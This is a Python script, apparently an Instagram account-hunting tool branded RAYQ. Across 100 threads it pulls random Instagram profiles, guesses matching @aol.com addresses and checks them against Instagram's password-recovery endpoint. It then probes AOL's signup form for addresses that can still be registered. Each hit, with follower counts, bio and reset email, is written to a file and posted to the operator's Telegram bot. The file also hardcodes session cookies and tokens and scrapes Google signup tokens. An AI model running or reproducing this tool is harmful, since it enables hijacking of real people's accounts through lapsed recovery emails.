
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
webbrowser.open("")
init(autoreset=True)
rayqheader = render(' AOL ', colors=['white', 'red'], align='center')
print("\033[1;31;40m═" * 67)
print(rayqheader)
print("\033[1;31;40m═" * 67)

id = input("- İd : ")
token = input("- Token : ")
os.system('clear')
print("\033[1;31;40m═" * 67)
print(rayqheader)
print("  ")
print("\033[1;31;40m═" * 67)

instagram_recovery_url = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
ig_sig_key_version = 'ig_sig_key_version'
signed_body = 'signed_body'
cookie_value = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
content_type_header = 'Content-Type'
cookie_header = 'Cookie'
user_agent_header = 'User-Agent'
default_user_agent = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
tk = 'tl.txt'
aol_domain = '@aol.com'

E_color = '\033[1;31m'
W9 = "\033[1m\033[34m"
M_color = '\x1b[1;37m'
HH = '\033[1;34m'
R_color = '\033[1;31;40m'
F_color = '\033[1;32;40m'
C_color = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}





import sys
import os

def memesex():
    os.system('clear')
    green = '\033[92m'
    red = '\033[91m'
    pink = '\033[95m'
    reset = '\033[0m'

    output = (
        f"\r𝐇𝐢𝐭 : {green}{hits}{reset}  "
        f"𝐁𝐚𝐝 : {red}{bad_insta + bad_email}{reset}  "
        f"𝐅𝐚𝐥𝐬𝐞 : {pink}{good_ig}{reset}    @RusyaBaskan\r"
    )
    sys.stdout.write(output)
    sys.stdout.flush()

def update_stats():
    memesex()

def rayqmain():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            user_agent_header: str(generate_user_agent())
        }
        recovery_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            content_type_header: 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': ('https://accounts.google.com/signup/v2/createaccount'
                        '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            user_agent_header: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post("https://accounts.google.com/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(tk, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        rayqmain()

rayqmain()

def aol_login(email):
    global hits, bad_email
    try:
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        text = qq.text
        specData = text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol.rq.txt')
            os.remove('aol.cokie.txt')
        except:
            pass
        with open('aol.rq.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
        with open('aol.cokie.txt', 'a') as g:
            g.write(str(cookies) + '\n')
        with open("aol.rq.txt", "r") as f:
            for line in f:
                specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
        with open("aol.cokie.txt", "r") as f:
            for line in f:
                cookies = eval(line.strip())
        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'validateField': 'userId',
        }
        if '@' in email:
            uname = email.split('@')[0]
        else:
            uname = email
        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={uname}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='
        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
            hits += 1
            memesex()
            if '@' not in email:
                ok = email + '@aol.com'
                uname, dom = ok.split('@')
                InfoAcc(uname, dom)
            else:
                uname, dom = email.split('@')
                InfoAcc(uname, dom)
        else:
            global bad_email
            bad_email += 1
            memesex()
    except Exception as e:
        print(e)


def check_aol(email):
    aol_login(email)

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        user_agent_header: ua,
        cookie_header: cookie_value,
        content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    data = {
        signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        ig_sig_key_version: '4'
    }
    response = requests.post(instagram_recovery_url, headers=headers, data=data).text
    if email in response:
        if aol_domain in email:
            check_aol(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'x-pigeon-session-id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'x-pigeon-rawclienttime': '1700251574.982',
            'x-ig-connection-speed': '-1kbps',
            'x-ig-bandwidth-speed-kbps': '-1.000',
            'x-ig-bandwidth-totalbytes-b': '0',
            'x-ig-bandwidth-totaltime-ms': '0',
            'x-bloks-version-id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'x-ig-connection-type': 'wifi',
            'x-ig-capabilities': '3brtvw==',
            'x-ig-app-id': '567067343352427',
            user_agent_header: ('instagram 100.0.0.17.129 android (29/10; 420dpi; '
                                '1080x2129; samsung; sm-m205f; m20lte; exynos7904; '
                                'en_gb; 161478664)'),
            'accept-language': 'en-gb, en-us',
            cookie_header: cookie_value,
            content_type_header: 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept-encoding': 'gzip, deflate',
            'host': 'i.instagram.com',
            'x-fb-http-engine': 'liger',
            'connection': 'keep-alive',
            'content-length': '356'
        }
        data = {
            signed_body: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            ig_sig_key_version: '4'
        }
        response = requests.post(instagram_recovery_url, headers=headers, data=data).json()
        matrx_reset = response.get('email', 'Reset None')
    except:
        matrx_reset = 'Reset None'
    return matrx_reset

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        return "Unknown"

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    calc_date = date(user_id) if user_id else "Unknown"
    total_hits += 1
    tlg = f"""    
𝐇𝐢𝐭 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈̇𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦
══════𝗥𝗔𝗬𝗤══════
𝐇𝐢𝐭𝐬 : [ {total_hits} ]
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 : [ {username} ]
𝐌𝐚𝐢𝐥 : [ {username}@{domain} ]
𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : [ {followers} ]
𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : [ {following} ]
𝐏𝐨𝐬𝐭 : [ {posts} ]
𝐃𝐚𝐭𝐞 : [ {calc_date} ]
𝐁𝐢𝐨 : [ {bio} ]
𝐑𝐞𝐬𝐭 : [ {rest(username)} ]
══════𝗥𝗔𝗬𝗤══════
𝐁𝐲 ~ @RusyaBaskan ~ @RayqTool

"""
    with open('Aol.txt', 'a') as f:
        f.write(tlg + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={tlg}")
    except Exception:
        pass

def rayq_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(279760000, 900990000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'x-fb-lsd': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                infoinsta[username] = account
                emails = [username + aol_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

from threading import Thread
Thread(target=stats_loop, daemon=True).start()

for _ in range(100):
    Thread(target=rayq_python).start()
